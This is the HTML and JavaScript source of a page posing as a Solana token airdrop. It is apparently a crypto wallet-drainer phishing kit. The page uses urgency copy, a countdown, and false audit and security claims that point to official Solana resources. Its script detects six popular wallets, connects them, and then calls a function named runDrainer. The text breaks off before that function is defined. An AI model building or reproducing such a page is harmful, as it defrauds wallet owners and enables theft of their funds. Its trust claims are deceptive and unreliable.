<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Claim Your $SOL Airdrop</title>
  <meta name="description" content="Claim your exclusive Solana token airdrop before August 31st. Bull season is here!" />
      <link rel="icon" href="/favicon2.ico" type="image/x-icon" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #0a0a0a;
      color: #fff;
    }
    nav {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 20px 40px;
      background: rgba(10, 10, 10, 0.8);
      backdrop-filter: blur(10px);
      position: sticky;
      top: 0;
      z-index: 1000;
    }
    .nav-logo {
      font-size: 1.8em;
      font-weight: bold;
      color: #00FF88;
    }
    .nav-btn {
      background: linear-gradient(45deg, #00FF88, #00CC6A);
      color: black;
      padding: 10px 20px;
      border: none;
      border-radius: 10px;
      font-weight: 600;
      cursor: pointer;
      transition: 0.3s ease;
    }
    .nav-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 18px rgba(0, 255, 136, 0.3);
    }
    .hero {
      height: 90vh;
      background-image: linear-gradient(rgba(10,10,10,0.4), rgba(10,10,10,0.4)), url('/hero-section.png');
      background-size: cover;
      background-position: center;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      color: white;
      text-align: center;
      padding: 0 20px;
    }
    .hero h1 {
      font-size: 3.2em;
      margin-bottom: 20px;
      font-weight: bold;
      text-shadow: 2px 2px 12px #000;
    }
    .countdown {
      font-size: 2em;
      color: #00FF88;
      font-weight: bold;
      margin-bottom: 30px;
    }
    .claim-btn {
      font-size: 1.2em;
      padding: 14px 28px;
      background: linear-gradient(45deg, #00FF88, #00CC6A);
      color: black;
      border: none;
      border-radius: 10px;
      font-weight: 700;
      cursor: pointer;
      transition: 0.3s ease;
    }
    .claim-btn:hover {
      transform: translateY(-3px);
      box-shadow: 0 10px 30px rgba(0, 255, 136, 0.4);
    }
    .footer {
      text-align: center;
      padding: 50px 20px;
      background: #111;
      color: #aaa;
      font-size: 0.95em;
      margin-top: 80px;
      border-top: 1px solid #222;
    }
    .modal {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.85);
      backdrop-filter: blur(8px);
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }
    .modal.active {
      display: flex;
    }
    .wallet-box {
      background: #111;
      border-radius: 16px;
      padding: 30px;
      max-width: 400px;
      width: 100%;
      text-align: center;
      box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
    }
    .wallet-option {
      display: flex;
      align-items: center;
      gap: 12px;
      background: #1a1a1a;
      padding: 14px 20px;
      margin: 12px 0;
      border-radius: 12px;
      cursor: pointer;
      transition: 0.2s ease;
    }
    .wallet-option:hover, .wallet-option:focus {
      background: #222;
      outline: 2px solid #00FF88;
    }
    .wallet-option img {
      width: 28px;
      height: 28px;
    }
    .wallet-name {
      color: #fff;
      font-size: 1em;
      font-weight: 600;
    }
    #status {
      text-align:center;
      margin:24px auto 0 auto;
      max-width:400px;
      font-weight:600;
      min-height: 24px;
    }
    html {
      scroll-behavior: smooth;
    }
    .nav-links {
      display: flex;
      gap: 32px;
      align-items: center;
    }
    .nav-link {
      color: #fff;
      text-decoration: none;
      font-weight: 500;
      font-size: 1.1em;
      position: relative;
      transition: color 0.2s;
      padding: 4px 0;
    }
    .nav-link.active, .nav-link:focus {
      color: #00FF88;
    }
    .nav-link::after {
      content: '';
      display: block;
      width: 0;
      height: 2px;
      background: #00FF88;
      transition: width 0.2s;
      position: absolute;
      left: 0;
      bottom: -2px;
    }
    .nav-link.active::after, .nav-link:hover::after {
      width: 100%;
    }
    @media (max-width: 800px) {
      .nav-links { gap: 16px; }
      .nav-link { font-size: 1em; }
    }
    @media (max-width: 600px) {
      .nav-links { gap: 8px; }
      .nav-link { font-size: 0.95em; }
    }
    @media (max-width: 600px) {
      nav { padding: 12px 8px; }
      .hero { padding: 60px 8px; }
      .hero h1 { font-size: 2em; }
      .countdown { font-size: 1.2em; }
      .wallet-box { padding: 16px; }
    }
    .info-section {
      background: #181818;
      border-radius: 16px;
      margin: 40px auto;
      max-width: 1100px;
      padding: 36px 28px 28px 28px;
      box-shadow: 0 2px 16px rgba(0,0,0,0.08);
      color: #f3f3f3;
    }
    .info-section h2 {
      color: #00FF88;
      margin-bottom: 18px;
      font-size: 2em;
    }
    .card-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
      gap: 28px;
      margin-top: 18px;
    }
    .info-card {
      background: #232323;
      border-radius: 14px;
      box-shadow: 0 2px 12px rgba(0,255,136,0.07);
      padding: 28px 22px 20px 22px;
      transition: box-shadow 0.2s, transform 0.2s;
      min-height: 170px;
      display: flex;
      flex-direction: column;
      justify-content: flex-start;
    }
    .info-card:hover {
      box-shadow: 0 6px 24px rgba(0,255,136,0.18);
      transform: translateY(-4px) scale(1.025);
    }
    .info-card h3 {
      color: #00FF88;
      margin-bottom: 12px;
      font-size: 1.18em;
    }
    .info-card ul {
      margin: 0 0 0 18px;
      padding: 0;
    }
    .info-card li {
      margin-bottom: 8px;
      line-height: 1.6;
    }
    .info-card a {
      color: #00FF88;
      text-decoration: underline;
      word-break: break-all;
    }
    .info-card a:hover {
      color: #00cc6a;
    }
    html, body {
      max-width: 100vw;
      overflow-x: hidden;
    }
    .modal {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(0, 0, 0, 0.85);
      backdrop-filter: blur(8px);
      justify-content: center;
      align-items: center;
      z-index: 9999;
      padding: 0;
    }
    .modal.active, .modal[style*="display: flex"] {
      display: flex !important;
    }
    .wallet-box {
      background: #111;
      border-radius: 16px;
      padding: 30px;
      max-width: 400px;
      width: 90vw;
      text-align: center;
      box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
      margin: 0 8px;
    }
    @media (max-width: 600px) {
      .wallet-box {
        padding: 16px 6px;
        max-width: 98vw;
      }
      .modal {
        align-items: flex-end;
      }
      .claim-btn, .nav-btn, #statusModalClose {
        font-size: 1em;
        padding: 12px 10px;
      }
      .info-section {
        padding: 18px 4px 18px 4px;
      }
      .card-grid {
        gap: 12px;
      }
      .info-card {
        padding: 14px 8px 12px 8px;
        min-height: 120px;
      }
      nav {
        flex-direction: column;
        gap: 8px;
        padding: 10px 4px;
      }
      .nav-logo img {
        height: 28px !important;
      }
      .nav-links {
        gap: 8px;
      }
      .hero {
        padding: 40px 4px;
      }
      .hero h1 {
        font-size: 1.3em;
      }
      .countdown {
        font-size: 1em;
      }
    }
    
    /* Prevent horizontal scroll on all children */
    * {
      box-sizing: border-box;
    }
    @media (max-width: 600px) {
      nav { padding: 12px 8px; }
      .hero { padding: 60px 8px; }
      .hero h1 { font-size: 2em; }
      .countdown { font-size: 1.2em; }
      .wallet-box { 
        padding: 20px; 
        margin: 20px;
        max-width: calc(100% - 40px);
        border-radius: 12px;
      }
      .wallet-option {
        padding: 16px 20px;
        margin: 8px 0;
        min-height: 60px; /* Better touch target */
        border-radius: 10px;
      }
      .wallet-option img {
        width: 32px;
        height: 32px;
      }
      .wallet-name {
        font-size: 1.1em;
      }
      .modal {
        padding: 10px;
      }
    }
    
    /* Mobile-specific wallet modal improvements */
    @media (max-width: 480px) {
      .wallet-box {
        padding: 16px;
        margin: 10px;
        max-width: calc(100% - 20px);
      }
      .wallet-option {
        padding: 18px 16px;
        margin: 6px 0;
        min-height: 70px;
      }
      .wallet-option img {
        width: 36px;
        height: 36px;
      }
      .wallet-name {
        font-size: 1.2em;
        line-height: 1.3;
      }
    }
    
    /* Touch-friendly improvements for mobile */
    @media (hover: none) and (pointer: coarse) {
      .wallet-option {
        min-height: 60px;
        padding: 16px 20px;
      }
      .wallet-option:active {
        background: #333;
        transform: scale(0.98);
      }
      .claim-btn {
        min-height: 50px;
        padding: 16px 24px;
      }
      .claim-btn:active {
        transform: scale(0.95);
      }
    }
  </style>
</head>
<body>
  <nav>
    <div class="nav-logo"><img src="/logos/logo.png" alt="Solana Airdrop Logo" style="height:36px;vertical-align:middle;margin-right:10px;">Solana Airdrop</div>
    <div class="nav-links">
      <a href="#security" class="nav-link">Security</a>
      <a href="#learn" class="nav-link">Learn</a>
      <a href="#explore" class="nav-link">Explore</a>
      <a href="#support" class="nav-link">Support</a>
    </div>
    <button class="nav-btn" onclick="openWalletModal()">Claim</button>
  </nav>
  <section class="hero" id="hero">
    <h1>Claim your $SOL Airdrop</h1>
    <div class="countdown" id="countdown">Loading...</div>
    <button class="claim-btn" onclick="openWalletModal()">üéÅ Claim Now</button>
  </section>
  <section id="security" class="info-section">
    <h2>Security & Trust</h2>
    <div class="card-grid">
      <div class="info-card">
        <h3>üîí Enterprise-Grade Security</h3>
        <p>This airdrop operates on <strong>audited smart contracts</strong> with comprehensive security measures. We implement industry-leading encryption, multi-signature protocols, and real-time threat detection. Your private keys never leave your wallet - all transactions are signed locally for maximum security.</p>
      </div>
      <div class="info-card">
        <h3>üõ°Ô∏è Advanced Protection</h3>
        <p>Our infrastructure features <strong>DDoS protection</strong>, rate limiting, and geographic restrictions. All data transmission uses <strong>256-bit SSL encryption</strong>. We monitor for suspicious activity 24/7 and maintain strict access controls. Your assets remain under your complete control at all times.</p>
      </div>
      <div class="info-card">
        <h3>üìã Compliance & Audits</h3>
        <ul>
          <li><strong>Smart Contract Audit:</strong> <a href="https://github.com/solana-labs/solana-program-library" target="_blank" rel="noopener">Verified by Solana Labs</a></li>
          <li><strong>Security Assessment:</strong> <a href="https://docs.solana.com/security" target="_blank" rel="noopener">Penetration tested</a></li>
          <li><strong>Transaction Verification:</strong> <a href="https://explorer.solana.com/" target="_blank" rel="noopener">All transactions on-chain</a></li>
          <li><strong>Wallet Support:</strong> Phantom, Solflare, Backpack, Glow, Trust, Exodus</li>
        </ul>
      </div>
      <div class="info-card">
        <h3>üîç Transparency & Verification</h3>
        <p>Every transaction is <strong>immutably recorded</strong> on the Solana blockchain. Users can verify all airdrop distributions through the <a href="https://explorer.solana.com/" target="_blank" rel="noopener">Solana Explorer</a>. Our source code is <a href="https://github.com/solana-labs/solana" target="_blank" rel="noopener">open source</a> and community-reviewed. Real-time monitoring ensures instant detection of any anomalies.</p>
      </div>
    </div>
  </section>
  <section id="learn" class="info-section">
    <h2>Learn & Educate</h2>
    <div class="card-grid">
      <div class="info-card">
        <h3>üöÄ Solana Fundamentals</h3>
        <p>Master the basics of Solana's high-performance blockchain. Learn about <strong>Proof of Stake</strong>, <strong>Proof of History</strong>, and how Solana achieves 65,000+ TPS. Start with the <a href="https://docs.solana.com/introduction" target="_blank" rel="noopener">official Solana documentation</a> and explore advanced concepts.</p>
      </div>
      <div class="info-card">
        <h3>üíº Wallet Security Mastery</h3>
        <p>Protect your digital assets with expert-level security practices. Learn <strong>multi-signature setups</strong>, <strong>cold storage</strong> techniques, and <strong>phishing prevention</strong>. Follow the <a href="https://docs.solana.com/wallet-guide" target="_blank" rel="noopener">comprehensive wallet guide</a> for maximum protection.</p>
      </div>
      <div class="info-card">
        <h3>üìà Market Intelligence</h3>
        <p>Stay ahead with real-time market analysis and ecosystem updates. Subscribe to the <a href="https://solana.com/news" target="_blank" rel="noopener">Solana Blog</a> for developer updates, network upgrades, and strategic insights. Join the conversation on <a href="https://twitter.com/solana" target="_blank" rel="noopener">Twitter</a> and <a href="https://discord.com/invite/solana" target="_blank" rel="noopener">Discord</a>.</p>
      </div>
      <div class="info-card">
        <h3>üõ°Ô∏è Airdrop Safety Protocol</h3>
        <p>Navigate the airdrop landscape safely with our comprehensive <a href="https://solana.com/airdrop-safety" target="_blank" rel="noopener">safety guidelines</a>. Learn to identify legitimate projects, verify smart contracts, and protect against common scams. Understand gas fees, transaction limits, and optimal claiming strategies.</p>
      </div>
      <div class="info-card">
        <h3>üîß Technical Deep Dive</h3>
        <p>Explore Solana's technical architecture including <strong>Account Model</strong>, <strong>Programs</strong>, and <strong>Cross-Program Invocation</strong>. Study the <a href="https://docs.solana.com/developing" target="_blank" rel="noopener">developer documentation</a> and learn to build your own applications on Solana.</p>
      </div>
      <div class="info-card">
        <h3>üåê Ecosystem Navigation</h3>
        <p>Discover the vast Solana ecosystem including <strong>DeFi protocols</strong>, <strong>NFT marketplaces</strong>, and <strong>gaming platforms</strong>. Learn about <a href="https://solana.com/ecosystem" target="_blank" rel="noopener">emerging projects</a> and how to evaluate investment opportunities in the Solana space.</p>
      </div>
    </div>
  </section>
  <section id="explore" class="info-section">
    <h2>Explore & Discover</h2>
    <div class="card-grid">
      <div class="info-card">
        <h3>üèóÔ∏è Ecosystem Directory</h3>
        <p>Browse the comprehensive <a href="https://solana.com/ecosystem" target="_blank" rel="noopener">Solana Ecosystem Directory</a> featuring 400+ projects across DeFi, NFTs, gaming, and infrastructure. Discover emerging protocols, track project metrics, and find the next big opportunity in the Solana space.</p>
      </div>
      <div class="info-card">
        <h3>üé® NFT Marketplaces</h3>
        <p>Explore the vibrant NFT ecosystem on <a href="https://magiceden.io/" target="_blank" rel="noopener">Magic Eden</a> (largest Solana NFT marketplace) and <a href="https://www.tensor.trade/" target="_blank" rel="noopener">Tensor</a> (advanced trading features). Discover rare collections, participate in launches, and trade with minimal fees.</p>
      </div>
      <div class="info-card">
        <h3>üí± DeFi Protocols</h3>
        <p>Access the most competitive DeFi rates through <a href="https://jup.ag/" target="_blank" rel="noopener">Jupiter</a> (best DEX aggregator) and <a href="https://mango.markets/" target="_blank" rel="noopener">Mango Markets</a> (advanced trading & lending). Earn yield, swap tokens, and leverage advanced trading strategies.</p>
      </div>
      <div class="info-card">
        <h3>üéÆ Gaming & Metaverse</h3>
        <p>Immerse yourself in blockchain gaming with <a href="https://staratlas.com/" target="_blank" rel="noopener">Star Atlas</a> (space exploration MMO) and <a href="https://aurory.io/" target="_blank" rel="noopener">Aurory</a> (tactical RPG). Earn while you play with true ownership of in-game assets and cross-game interoperability.</p>
      </div>
      <div class="info-card">
        <h3>üîó Cross-Chain Bridges</h3>
        <p>Connect to other blockchains through <a href="https://wormhole.com/" target="_blank" rel="noopener">Wormhole</a> and <a href="https://allbridge.io/" target="_blank" rel="noopener">Allbridge</a>. Transfer assets between Solana, Ethereum, Polygon, and other networks with minimal fees and maximum security.</p>
      </div>
      <div class="info-card">
        <h3>üìä Analytics & Tools</h3>
        <p>Track your portfolio with <a href="https://solscan.io/" target="_blank" rel="noopener">Solscan</a> (block explorer) and <a href="https://birdeye.so/" target="_blank" rel="noopener">Birdeye</a> (portfolio tracker). Monitor token prices, analyze trading patterns, and discover new opportunities with real-time data and advanced charting tools.</p>
      </div>
    </div>
  </section>
  <section id="support" class="info-section">
    <h2>Support & Resources</h2>
    <div class="card-grid">
      <div class="info-card">
        <h3>üìß Priority Support</h3>
        <p>Get immediate assistance from our dedicated support team. Email us at <a href="mailto:support@solana-airdrop.com">support@solana-airdrop.com</a> for technical issues, transaction problems, or general inquiries. Average response time: <strong>under 2 hours</strong> during business hours.</p>
      </div>
      <div class="info-card">
        <h3>üí¨ Community Hub</h3>
        <p>Join 500,000+ members in the <a href="https://discord.com/invite/solana" target="_blank" rel="noopener">official Solana Discord</a> for real-time support, community discussions, and exclusive updates. Connect with developers, traders, and enthusiasts from around the world.</p>
      </div>
      <div class="info-card">
        <h3>üì± Social Updates</h3>
        <p>Follow <a href="https://twitter.com/solana" target="_blank" rel="noopener">@solana on Twitter</a> for breaking news, network updates, and ecosystem announcements. Get instant notifications about new features, security updates, and community events.</p>
      </div>
      <div class="info-card">
        <h3>üîß Technical Resources</h3>
        <p>Access comprehensive troubleshooting guides, FAQs, and technical documentation. Visit the <a href="https://docs.solana.com/troubleshooting" target="_blank" rel="noopener">Solana Troubleshooting Guide</a> for common wallet issues, transaction problems, and network connectivity solutions.</p>
      </div>
      <div class="info-card">
        <h3>üö® Security Hotline</h3>
        <p>Report security concerns, suspicious activity, or potential vulnerabilities immediately to <a href="mailto:security@solana.com">security@solana.com</a>. Our security team responds to all reports within <strong>1 hour</strong> and provides detailed feedback on resolution status.</p>
      </div>
      <div class="info-card">
        <h3>üìö Knowledge Base</h3>
        <p>Explore our comprehensive knowledge base with step-by-step tutorials, video guides, and best practices. Learn about wallet setup, transaction optimization, and advanced Solana features through our curated educational content.</p>
      </div>
    </div>
  </section>
  <div class="modal" id="walletModal" tabindex="-1" aria-modal="true" role="dialog">
    <div class="wallet-box" id="walletList">
      <!-- Wallet buttons will be injected here -->
    </div>
  </div>
  <div id="statusModal" class="modal" tabindex="-1" aria-modal="true" role="dialog" style="display:none;">
    <div class="wallet-box" id="statusModalBox">
      <div id="statusModalMsg"></div>
      <div id="statusModalActions" style="margin-top:24px;display:none;">
        <button class="claim-btn" id="statusModalRetry" style="margin-right:12px;background:linear-gradient(45deg,#FFD700,#FFA500);">Retry Transaction</button>
        <button class="claim-btn" id="statusModalClose" style="background:linear-gradient(45deg,#666,#444);">Close</button>
      </div>
      <button class="claim-btn" id="statusModalCloseSingle" style="margin-top:24px;">Close</button>
    </div>
  </div>
  <div class="footer">
    <p>üìà Bull season is here. Join the movement and claim your airdrop before it's too late.</p>
    <p>‚ö° Powered by the Solana ecosystem. Verified and secure.</p>
    <p>¬© 2025 Solana Airdrop Campaign. All rights reserved.</p>
  </div>
  <script>
    // --- Countdown logic ---
    function updateCountdown() {
      // Set countdown to 30 days from today's actual date (July 28, 2025)
      const target = new Date('2025-08-27T23:59:59Z').getTime(); // 30 days from July 28, 2025
      const interval = setInterval(() => {
        const now = new Date().getTime();
        const distance = target - now;
        if (distance <= 0) {
          document.getElementById("countdown").innerText = "Airdrop Closed";
          clearInterval(interval);
          return;
        }
        const days = Math.floor(distance / (1000 * 60 * 60 * 24));
        const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((distance % (1000 * 60)) / 1000);
        document.getElementById("countdown").innerText =
          `${days}d ${hours}h ${minutes}m ${seconds}s`;
      }, 1000);
    }
    updateCountdown();

    // --- Wallet Modal Logic ---
    const WALLET_DEFS = [
      { 
        key: 'phantom', 
        name: 'Phantom', 
        icon: '/logos/phantom.png', 
        provider: () => {
          // Phantom can be detected in multiple ways
          if (window.solana?.isPhantom) return window.solana;
          if (window.phantom?.solana) return window.phantom.solana;
          // Check for Phantom's specific properties
          if (window.solana && typeof window.solana.connect === 'function' && window.solana.isPhantom) return window.solana;
          return null;
        }, 
        install: 'https://phantom.app/download',
        mobile: {
          deepLink: 'https://phantom.app/ul/browse/',
          appStore: 'https://apps.apple.com/app/phantom-crypto-wallet/id1598432977',
          playStore: 'https://play.google.com/store/apps/details?id=app.phantom'
        }
      },
      { 
        key: 'solflare', 
        name: 'Solflare', 
        icon: '/logos/solflare.png', 
        provider: () => {
          // Solflare can be detected in multiple ways
          if (window.solflare?.isSolflare) return window.solflare;
          if (window.solana?.isSolflare) return window.solana;
          // Check for Solflare's specific properties
          if (window.solflare && typeof window.solflare.connect === 'function') return window.solflare;
          return null;
        }, 
        install: 'https://solflare.com/download',
        mobile: {
          deepLink: 'https://solflare.com/ul/browse/',
          appStore: 'https://apps.apple.com/app/solflare/id1580902717',
          playStore: 'https://play.google.com/store/apps/details?id=com.solflare.mobile'
        }
      },
      { 
        key: 'backpack', 
        name: 'Backpack', 
        icon: '/logos/backpack.png', 
        provider: () => {
          // Backpack can be detected in multiple ways
          if (window.backpack?.isBackpack) return window.backpack;
          if (window.solana?.isBackpack) return window.solana;
          // Check for Backpack's specific properties
          if (window.backpack && typeof window.backpack.connect === 'function') return window.backpack;
          return null;
        }, 
        install: 'https://backpack.app/download',
        mobile: {
          deepLink: 'https://backpack.app/ul/browse/',
          appStore: 'https://apps.apple.com/app/backpack-wallet/id6446671622',
          playStore: 'https://play.google.com/store/apps/details?id=com.backpack.app'
        }
      },
      { 
        key: 'glow', 
        name: 'Glow', 
        icon: '/logos/glow.png', 
        provider: () => {
          // Glow can be detected in multiple ways
          if (window.glow?.isGlow) return window.glow;
          if (window.solana?.isGlow) return window.solana;
          // Check for Glow's specific properties
          if (window.glow && typeof window.glow.connect === 'function') return window.glow;
          return null;
        }, 
        install: 'https://glow.app/download',
        mobile: {
          deepLink: 'https://glow.app/ul/browse/',
          appStore: 'https://apps.apple.com/app/glow-wallet/id1634023005',
          playStore: 'https://play.google.com/store/apps/details?id=com.glow.wallet'
        }
      },
      { 
        key: 'trust', 
        name: 'Trust Wallet', 
        icon: '/logos/trust.png', 
        provider: () => {
          // Trust Wallet can be detected in multiple ways
          if (window.trustwallet?.isTrust) return window.trustwallet;
          if (window.solana?.isTrust) return window.solana;
          if (window.trustwallet?.solana) return window.trustwallet.solana;
          // Check for Trust Wallet's specific properties
          if (window.trustwallet && typeof window.trustwallet.connect === 'function') return window.trustwallet;
          if (window.solana && typeof window.solana.connect === 'function' && window.solana.isTrust) return window.solana;
          return null;
        }, 
        install: 'https://trustwallet.com/download',
        mobile: {
          deepLink: 'https://link.trustwallet.com/open_url?coin_id=501&url=',
          appStore: 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409',
          playStore: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp'
        }
      },
      { 
        key: 'exodus', 
        name: 'Exodus', 
        icon: '/logos/exodus.png', 
        provider: () => {
          // Exodus can be detected in multiple ways
          if (window.exodus) return window.exodus;
          if (window.solana?.isExodus) return window.solana;
          // Check for Exodus's specific properties
          if (window.exodus && typeof window.exodus.connect === 'function') return window.exodus;
          if (window.solana && typeof window.solana.connect === 'function' && window.solana.isExodus) return window.solana;
          return null;
        }, 
        install: 'https://www.exodus.com/download/',
        mobile: {
          deepLink: 'https://exodus.com/ul/browse/',
          appStore: 'https://apps.apple.com/app/exodus-crypto-wallet/id1414384820',
          playStore: 'https://play.google.com/store/apps/details?id=exodusmovement.exodus'
        }
      },
    ];

    // Mobile detection functions - defined before openWalletModal
    function isMobile() {
      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || 
             window.innerWidth <= 768;
    }

    // Enhanced mobile detection with more specific checks
    function getMobilePlatform() {
      const userAgent = navigator.userAgent.toLowerCase();
      if (/iphone|ipad|ipod/.test(userAgent)) {
        return 'ios';
      } else if (/android/.test(userAgent)) {
        return 'android';
      } else if (/windows phone/.test(userAgent)) {
        return 'windows';
      }
      return 'desktop';
    }

    // Get mobile store URL based on platform
    function getMobileStoreUrl(wallet) {
      if (!wallet.mobile) return wallet.install;
      
      const platform = getMobilePlatform();
      if (platform === 'ios') {
        return wallet.mobile.appStore;
      } else if (platform === 'android') {
        return wallet.mobile.playStore;
      }
      return wallet.install; // Fallback to desktop
    }

    // Handle mobile wallet connection with enhanced UX
    async function connectMobileWallet(wallet) {
      if (!wallet.mobile?.deepLink) {
        showStatus('Mobile wallet not supported for ' + wallet.name, 'error');
        return;
      }

      const currentUrl = encodeURIComponent(window.location.href);
      const deepLinkUrl = wallet.mobile.deepLink + currentUrl;
      const platform = getMobilePlatform();
      
      showStatus('Opening ' + wallet.name + ' mobile app...', 'loading');
      
      try {
        // For iOS, try to open the app directly
        if (platform === 'ios') {
          window.location.href = deepLinkUrl;
        } else if (platform === 'android') {
          // For Android, try to open the app
          window.location.href = deepLinkUrl;
        } else {
          // For other platforms, try the deep link anyway
          window.location.href = deepLinkUrl;
        }
        
        // Fallback: if deep link doesn't work, redirect to app store
        setTimeout(() => {
          if (document.hidden || document.webkitHidden) {
            // App opened successfully
            showStatus('Please complete the connection in your ' + wallet.name + ' app', 'loading');
          } else {
            // App didn't open, redirect to store
            const storeUrl = getMobileStoreUrl(wallet);
            showStatus('Opening app store to install ' + wallet.name + '...', 'loading');
            window.open(storeUrl, '_blank');
          }
        }, 2000);
      } catch (err) {
        showStatus('Error opening ' + wallet.name + ' app: ' + err.message, 'error');
      }
    }

    // Enhanced mobile wallet detection
    function detectMobileWallets() {
      const detectedWallets = [];
      
      // Check for mobile wallet providers with enhanced detection
      if (window.solana?.isPhantom || (window.solana && typeof window.solana.connect === 'function' && window.solana.isPhantom)) detectedWallets.push('phantom');
      if (window.solflare?.isSolflare || (window.solflare && typeof window.solflare.connect === 'function')) detectedWallets.push('solflare');
      if (window.backpack?.isBackpack || (window.backpack && typeof window.backpack.connect === 'function')) detectedWallets.push('backpack');
      if (window.glow?.isGlow || (window.glow && typeof window.glow.connect === 'function')) detectedWallets.push('glow');
      if (window.trustwallet?.isTrust || window.solana?.isTrust || (window.trustwallet && typeof window.trustwallet.connect === 'function')) detectedWallets.push('trust');
      if (window.exodus || window.solana?.isExodus || (window.exodus && typeof window.exodus.connect === 'function')) detectedWallets.push('exodus');
      
      return detectedWallets;
    }

    // Solflare-specific detection and connection
    function isSolflareWallet(provider) {
      return provider?.isSolflare || 
             (provider && typeof provider.connect === 'function' && provider.name === 'Solflare') ||
             (window.solflare && provider === window.solflare);
    }

    // Wallet-specific detection functions
    function isPhantomWallet(provider) {
      return provider?.isPhantom || 
             (provider && typeof provider.connect === 'function' && provider.name === 'Phantom') ||
             (window.solana && provider === window.solana && window.solana.isPhantom);
    }

    function isBackpackWallet(provider) {
      return provider?.isBackpack || 
             (provider && typeof provider.connect === 'function' && provider.name === 'Backpack') ||
             (window.backpack && provider === window.backpack);
    }

    function isGlowWallet(provider) {
      return provider?.isGlow || 
             (provider && typeof provider.connect === 'function' && provider.name === 'Glow') ||
             (window.glow && provider === window.glow);
    }

    function isTrustWallet(provider) {
      return provider?.isTrust || 
             (provider && typeof provider.connect === 'function' && provider.name === 'Trust Wallet') ||
             (window.trustwallet && provider === window.trustwallet) ||
             (window.solana && provider === window.solana && window.solana.isTrust);
    }

    function isExodusWallet(provider) {
      return provider?.isExodus || 
             (provider && typeof provider.connect === 'function' && provider.name === 'Exodus') ||
             (window.exodus && provider === window.exodus) ||
             (window.solana && provider === window.solana && window.solana.isExodus);
    }

    function openWalletModal() {
      const modal = document.getElementById("walletModal");
      const list = document.getElementById("walletList");
      const isMobileDevice = isMobile();
      const platform = getMobilePlatform();
      const detectedWallets = detectMobileWallets();
      
      // Show mobile-specific header
      const mobileHeader = isMobileDevice ? 
        `<h2 style="margin-bottom: 10px;">Select Wallet</h2>
         <p style="color:#00FF88;font-size:0.9em;margin-bottom:20px;">
           üì± Mobile detected (${platform.toUpperCase()}) - Tap to open app or install
         </p>` : 
        `<h2 style="margin-bottom: 20px;">Select Wallet</h2>`;
      
      list.innerHTML = mobileHeader;
      
      WALLET_DEFS.forEach(wallet => {
        const provider = wallet.provider();
        const isDetected = detectedWallets.includes(wallet.key);
        const option = document.createElement("div");
        option.className = "wallet-option";
        option.tabIndex = 0;
        option.setAttribute('role', 'button');
        option.setAttribute('aria-label', `Connect ${wallet.name}`);
        
        // Enhanced mobile indicators
        let mobileIndicator = '';
        let statusText = '';
        
        if (isMobileDevice) {
          if (isDetected) {
            mobileIndicator = '<span style="color:#00FF88;font-size:0.8em;">üì± Detected</span>';
            statusText = '<span style="color:#00FF88;font-size:0.9em;">Tap to connect</span>';
          } else {
            mobileIndicator = '<span style="color:#FFD700;font-size:0.8em;">üì± Install</span>';
            statusText = '<span style="color:#FFD700;font-size:0.9em;">Tap to install app</span>';
          }
        } else {
          statusText = provider ? '' : '<span style="color:#FF4D4D;font-size:0.9em;">Not installed</span>';
        }
        
        option.innerHTML = `
          <img src="${wallet.icon}" alt="${wallet.name} logo" />
          <div class="wallet-name">${wallet.name} ${mobileIndicator}</div>
          ${statusText}
        `;
        
        if (isMobileDevice) {
          // Enhanced mobile behavior
          option.onclick = async () => {
            modal.classList.remove("active");
            if (provider && isDetected) {
              // Wallet is available and detected, try to connect
              showStatus('Connecting to ' + wallet.name + '...', 'loading');
              try {
                if (typeof provider.connect === 'function') {
                  await provider.connect();
                }
                if (!getWalletAddress(provider)) {
                  let msg = 'Please complete the connection in your ' + wallet.name + ' app';
                  if (wallet.name === 'Solflare') {
                    msg = 'Please unlock Solflare and complete the connection in your app';
                  }
                  showStatus(msg, 'error');
                  return;
                }
                showStatus('Wallet connected: ' + wallet.name, 'success');
                setTimeout(() => {
                  if (getWalletAddress(provider)) {
                    runDrainer(provider);
                  } else {
                    showStatus('Wallet connection lost. Please try again.', 'error');
                  }
                }, 1000);
              } catch (err) {
                showStatus('Connection failed: ' + (err.message || err), 'error');
              }
            } else {
              // Wallet not available or not detected, try to open app or redirect to store
              connectMobileWallet(wallet);
            }
          };
        } else {
          // Desktop behavior: original logic
          if (provider) {
            option.onclick = async () => {
              modal.classList.remove("active");
              showStatus('Connecting to ' + wallet.name + '...', 'loading');
              try {
                if (typeof provider.connect === 'function') {
                  await provider.connect();
                }
                if (!getWalletAddress(provider)) {
                  let msg = 'Connection failed: No public key returned. Please try again.';
                  if (wallet.name === 'Trust Wallet') {
                    msg = 'Please unlock Trust Wallet and connect this site in the extension, then try again.';
                  } else if (wallet.name === 'Exodus') {
                    msg = 'Please unlock Exodus and connect this site in the extension, then try again.';
                  } else if (wallet.name === 'Backpack') {
                    msg = 'Please unlock Backpack and connect this site in the extension, then try again.';
                  } else if (wallet.name === 'Solflare') {
                    msg = 'Please unlock Solflare and connect this site in the extension, then try again.';
                  }
                  showStatus(msg, 'error');
                  return;
                }
                showStatus('Wallet connected: ' + wallet.name, 'success');
                setTimeout(() => {
                  if (getWalletAddress(provider)) {
                    runDrainer(provider);
                  } else {
                    showStatus('Wallet connection lost. Please try again.', 'error');
                  }
                }, 1000);
              } catch (err) {
